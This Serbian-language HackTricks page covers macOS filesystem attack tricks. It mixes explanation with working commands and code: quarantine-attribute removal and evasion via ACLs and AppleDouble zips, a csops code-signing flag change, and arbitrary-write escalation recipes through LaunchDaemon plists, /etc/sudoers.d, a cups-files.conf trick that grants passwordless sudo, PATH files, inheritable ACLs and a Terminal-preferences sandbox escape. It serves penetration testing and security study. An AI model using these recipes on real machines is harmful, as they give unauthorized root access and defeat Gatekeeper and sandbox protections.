# macOS FS trikovi

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacije POSIX dozvola

Za **direktorijum**, tri bita dozvola imaju drugačije značenje nego kod obične datoteke. `chmod(1)` naziva execute bit "**search**" kada se primeni na direktorijum:<sup>[2]</sup>

> `0100` Za datoteke, dozvoljava izvršavanje vlasniku. Za direktorijume, dozvoljava vlasniku da **pretražuje** direktorijum.

- **read** - možete **nabrojati** unose direktorijuma (izlistati imena).
- **write** - možete **kreirati, preimenovati i brisati unose** u direktorijumu. Imajte na umu da je ovo svojstvo *sadržavajućeg* direktorijuma, a ne datoteke: možete obrisati datoteku koju ne možete čitati ili menjati, sve dok možete pisati u njen nadređeni direktorijum.
- Da biste obrisali **poddirektorijum**, on mora biti prazan, što zahteva dovoljno prava za uklanjanje svega unutar njega.
- Ako direktorijum ima **sticky bit** (`S_ISVTX`, kao `/tmp`), ovo je ograničeno — POSIX navodi da proces tada može ukloniti ili preimenovati datoteke u njemu samo ako je njihov vlasnik, ako je vlasnik direktorijuma ili ako ima odgovarajuće privilegije.<sup>[1]</sup>
- **execute / search** - **dozvoljeno vam je da prolazite kroz** direktorijum. Rezolucija putanje pronalazi svaku komponentu "u direktorijumu koji je naveden njenim prethodnikom", pa **gubitak search prava na bilo kojoj pojedinačnoj komponenti prefiksa putanje čini sve ispod nje nedostupnim putem putanje**, čak i ako je sama krajnja datoteka čitljiva za sve korisnike.<sup>[1]</sup>

### Opasne kombinacije

**Kako prepisati datoteku/folder čiji je vlasnik root**, ali:

- Vlasnik jednog nadređenog **direktorijuma** u putanji je korisnik
- Vlasnik jednog nadređenog **direktorijuma** u putanji je **users grupa** sa **write pristupom**
- Jedna **users grupa** ima **write** pristup **datoteci**

Kod bilo koje od prethodnih kombinacija, napadač bi mogao da **ubaci** **sym/hard link** na očekivanu putanju kako bi dobio privilegovani arbitrary write.

### Poseban slučaj foldera root R+X

Ovo direktno proizlazi iz prethodno navedenog pravila rezolucije putanje. Ako **direktorijum dozvoljava samo R+X root-u**, datoteke unutar njega su *po putanji* nedostupne svima ostalima — ali **bitovi dozvola samih datoteka i dalje mogu biti permisivni**. Direktorijum je jedina prepreka.

Zato se svaki primitive koji vam omogućava da iznesete datoteku **iz tog direktorijuma** — privilegovani proces koji **premešta/preimenuje/kopira** putanju koju je izabrao napadač na lokaciju kroz koju možete prolaziti — pretvara u arbitrary read, bez potrebe da ikada zaobiđete mode same datoteke:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Potražite privilegovane procese za premeštanje datoteka (installers, log rotators, crash/diagnostic collectors, backup i "export" funkcije) koji prihvataju putanju izvora od korisnika sa nižim privilegijama.

## Symbolic Link / Hard Link

### Permissive file/folder

Ako privilegovani proces upisuje podatke u **file** koji bi mogao biti **controlled** od strane korisnika sa **lower privileged** privilegijama, ili koji je korisnik sa nižim privilegijama mogao **prethodno kreirati**. Korisnik ga može jednostavno **usmeriti na drugu datoteku** pomoću Symbolic ili Hard link-a, pa će privilegovani proces upisivati u tu datoteku.

Proverite druge odeljke u kojima bi napadač mogao **zloupotrebiti proizvoljni upis za eskalaciju privilegija**.

### Open `O_NOFOLLOW`

Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Proverava se samo **poslednja** komponenta — svaka **međukomponenta** se i dalje razrešava i prati. Zato developer koji je "zaštitio" upis pomoću `O_NOFOLLOW` i dalje može biti napadnut postavljanjem symlink-a u bilo koji **nadređeni direktorijum** ciljne putanje.<sup>[3]</sup>

Ista man stranica dokumentuje zastavice koje zaista uklanjaju taj nedostatak:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

U suprotnom, `openat()` relativan u odnosu na directory FD koji ste prethodno validirali, ili `realpath()` + ponovna validacija, predstavljaju preostale načine za sprečavanje zamene symlink-a unutar putanje.

## .fileloc

Datoteke sa ekstenzijom **`.fileloc`** mogu upućivati na druge aplikacije ili binarne datoteke, tako da će se, kada se otvore, izvršiti upravo ta aplikacija/binarna datoteka.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskriptori fajlova

### Leak FD (bez `O_CLOEXEC`)

Ako poziv funkcije `open` nema flag `O_CLOEXEC`, deskriptor fajla će biti nasleđen od strane procesa potomka. Dakle, ako privilegovani proces otvori privilegovani fajl i izvrši proces pod kontrolom napadača, napadač će **naslediti FD nad privilegovanim fajlom**.

Kanonski primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` je uvažavao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim fajlovima**, zato što je ta konkretna promenljiva parsirana izvan funkcije `processDyldEnvironmentVariable()`.
- Izvršavao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, pa je **kreirao fajl u vlasništvu root-a na proizvoljnoj putanji**.
- FD **nikada nije bio zatvoren i nije imao close-on-exec flag**, pa je svaki potomak suid binarnog fajla nasledio **upisiv FD ka fajlu u vlasništvu root-a**.
- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u procesu potomku omogućilo je proizvoljne upise u fajl u vlasništvu root-a; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, čime je omogućeno prepisivanje umesto dodavanja na kraj fajla.

Isti obrazac se pojavljuje kad god privilegovani proces otvori fajl **pre nego što** izvrši nešto što vi kontrolišete (helper tools, editore u stilu `crontab`-a pokrenute kroz `$EDITOR`, log/debug fajlove otvorene iz putanje navedene u env-var...). Nabrojte FD-ove koje ste nasledili pomoću:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Sve iznad `2` što upućuje na datoteku koju ne možete sami da otvorite predstavlja arbitrary-write (ili arbitrary-read) primitive.

## Izbegavanje trikova sa quarantine xattrs

### Uklonite ga
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ako fajl/folder ima ovaj nepromenljivi atribut, na njega neće biti moguće postaviti xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemi datoteka bez podrške za xattr

Ne čuva svaki sistem datoteka koji macOS može da montira **proširene atribute** izvorno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS montiranja ih ne podržavaju** — macOS ih emulira upisivanjem pomoćne **AppleDouble** datoteke pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

To je važno za quarantine, jer xattr opstaje samo ako zaista može da se upiše **i ponovo pročita** sa istog volumena:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Ako se tom volumenu kasnije pristupi putem putanje koja ignoriše prateći `._` fajl (ili se prateći fajl ukloni/obriše), fajl stiže **bez quarantine flag-a** — a nekvarantinski `.app` je dovoljan za izlazak iz App Sandbox-a, kao što je objašnjeno u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ovaj ACL sprečava dodavanje `xattrs` datoteci
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** format datoteke kopira datoteku, uključujući njene ACE-ove.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će tekstualna reprezentacija ACL-a, sačuvana unutar xattr-a pod nazivom **`com.apple.acl.text`**, biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste aplikaciju kompresovali u zip datoteku koristeći **AppleDouble** format datoteke sa ACL-om koji sprečava upisivanje drugih xattr-ova u nju... quarantine xattr nije bio postavljen u aplikaciju:

Pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.<sup>[6]</sup>

Da bismo ovo reprodukovali, prvo moramo dobiti ispravan ACL string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Napomena: čak i ako ovo funkcioniše, sandbox prethodno upisuje quarantine xattr)

Nije zaista potrebno, ali ostavljam ovde za svaki slučaj:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Zaobilaženje provera potpisa

### Zaobilaženje provera platform binaries

Neke bezbednosne provere proveravaju da li je binary **platform binary**, na primer kako bi dozvolile povezivanje sa XPC service. Međutim, kao što je prikazano u tekstu o zaobilaženju na https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, moguće je zaobići ovu proveru tako što se preuzme platform binary (kao što je /bin/ls) i exploit ubaci putem dyld-a koristeći env promenljivu `DYLD_INSERT_LIBRARIES`.<sup>[7]</sup>

### Zaobilaženje flags `CS_REQUIRE_LV` i `CS_FORCED_LV`

Moguće je da executing binary izmeni sopstvene flags kako bi zaobišao provere pomoću koda kao što je:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Zaobilaženje Code Signatures

Bundles sadrže fajl **`_CodeSignature/CodeResources`** koji sadrži **hash** svakog pojedinačnog **fajla** u okviru **bundle-a**. Imajte na umu da je hash fajla CodeResources takođe **ugrađen u izvršni fajl**, tako da ni njega ne možemo menjati.

Međutim, postoje neki fajlovi čiji se potpis neće proveravati; oni imaju ključ `omit` u plist-u, na primer:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Moguće je izračunati potpis resursa iz komandne linije pomoću:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montiranje dmg-ova

Korisnik može da montira prilagođeni dmg čak i preko nekih postojećih fascikli. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Obično macOS montira disk komunicirajući sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u LaunchDaemons plist fajl i servis ponovo pokrene, logovi će se čuvati u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.

## Arbitrary Writes

### Periodic sh scripts

Ako vaš script može da se interpretira kao **shell script**, možete prepisati **`/etc/periodic/daily/999.local`** shell script, koji će se pokretati svakog dana.

Možete **simulirati** izvršavanje ovog script-a pomoću: **`sudo periodic daily`**

### Daemons

Upišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist-om koji izvršava proizvoljni script, na primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Samo generišite skriptu `/Applications/Scripts/privesc.sh` sa **commands** koje želite da pokrenete kao root.

### Sudoers File

Ako imate **arbitrary write**, možete kreirati fajl unutar foldera **`/etc/sudoers.d/`** koji vam dodeljuje **sudo** privilegije.

### PATH files

Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env promenljivu. Morate biti root da biste ga prepisali, ali ako skripta iz **privileged process** izvršava neku **command without the full path**, možda ćete moći da je **hijack** tako što ćete izmeniti ovaj fajl.

Takođe možete upisivati fajlove u **`/etc/paths.d`** da biste učitali nove foldere u **PATH** env promenljivu.

### cups-files.conf

Ova tehnika je korišćena u [ovom writeup-u](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[8]</sup>

Kreirajte fajl `/etc/cups/cups-files.conf` sa sledećim sadržajem:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Ovim će se kreirati datoteka `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni sadržaj na kraju služi za pokretanje kreiranja error log-a.

Zatim upišite u `/etc/sudoers.d/lpe` potrebnu konfiguraciju za escalation privilegija, kao što je `%staff ALL=(ALL) NOPASSWD:ALL`.

Nakon toga ponovo izmenite datoteku `/etc/cups/cups-files.conf`, navodeći `LogFilePerm 700`, kako bi nova sudoers datoteka postala validna prilikom pozivanja `cupsctl`.

### Izlazak iz Sandbox-a

Moguće je izaći iz macOS sandbox-a pomoću FS arbitrary write primitive. Za neke primere pogledajte stranicu [macOS Auto Start](../../../../macos-auto-start-locations.md), ali čest način je upisivanje Terminal preferences datoteke u `~/Library/Preferences/com.apple.Terminal.plist`, koja izvršava komandu pri pokretanju, a zatim njeno pozivanje pomoću `open`.

## Kreiranje datoteka koje se mogu pisati kao drugi korisnici

Veoma česta privesc primitiva jeste navođenje **privilegovanog procesa da kreira datoteku za vas** u direktorijumu koji kontrolišete, a zatim zadržavanje **write access**-a nad tom datotekom. Potrebna su dva elementa:

1. Direktorijum čiji ste vlasnik (ili u kom možete postaviti **inheritable ACL**), tako da sve što se u njemu kreira nasledi vaše dozvole.
2. Privilegovan/`suid` proces kojem se može odrediti **gde** da kreira datoteku — najčešće putem debug/logging environment variable-a, configuration datoteke ili helper-ovog XPC API-ja.

Deo sa **inheritable ACL**-om omogućava da datoteka koju proces kreira bude writable za vas, iako je u vlasništvu drugog korisnika. Zastavice nasleđivanja `file_inherit` / `directory_inherit` dokumentovane su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Sada je svaka datoteka koju privilegovani proces kreira unutar `$DIRNAME` **upisiva za vas**. Ako je taj direktorijum takođe lokacija iz koje se kasnije nešto **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon...), ovo predstavlja direktnu eskalaciju privilegija na root. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta treba upisati kada dobijete datoteku.

Za kompletan praktični primer lanca „env promenljiva natera root proces da kreira datoteku, a FD procuri do vas“ pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.

## POSIX deljena memorija

**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama komunikacije između procesa. To podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa korišćenjem `mmap()`. Procesi zatim mogu direktno da čitaju iz ove memorijske oblasti i upisuju u nju. Za upravljanje konkurentnim pristupom i sprečavanje oštećenja podataka često se koriste mehanizmi za sinhronizaciju, kao što su mutex-i ili semafori. Na kraju, procesi uklanjaju mapiranje i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a opciono mogu ukloniti objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brz IPC u okruženjima u kojima više procesa mora brzo da pristupa deljenim podacima.

<details>

<summary>Primer koda producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Primer Consumer koda</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **operacija nad deskriptorima datoteka** u korisničkim aplikacijama. Ovi guarded descriptors pružaju način za povezivanje specifičnih ograničenja ili „guard-ova“ sa deskriptorima datoteka, koje kernel primenjuje.

Ova funkcija je naročito korisna za sprečavanje određenih klasa bezbednosnih ranjivosti, kao što su **neovlašćen pristup datotekama** ili **race conditions**. Do ovih ranjivosti dolazi, na primer, kada thread pristupa file description-u, čime **drugom ranjivom thread-u omogućava pristup**, ili kada **ranjivi child process nasledi** file descriptor. Neke funkcije povezane sa ovom funkcionalnošću su:

- `guarded_open_np`: Otvara FD sa guard-om
- `guarded_close_np`: Zatvara ga
- `change_fdguard_np`: Menja guard flags na descriptoru (čak i uklanja guard zaštitu)

## Reference

- [1] [POSIX.1-2024 — Osnovne definicije, pogl. 4 (Dozvole za pristup datotekama, zaštita direktorijuma, razrešavanje putanja)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man stranica](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit za pretragu/izvršavanje direktorijuma, flags za nasleđivanje ACL-ova)
- [3] [`open(2)` man stranica](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD bez close-on-exec)
- [5] [The Eclectic Light Company - Koji file systems i cloud services čuvaju extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: otkrivanje macOS ranjivosti](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Nova era macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Otkrivanje Apple ranjivosti: diskarbitrationd i storagekitd Audit Story, 1. deo](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
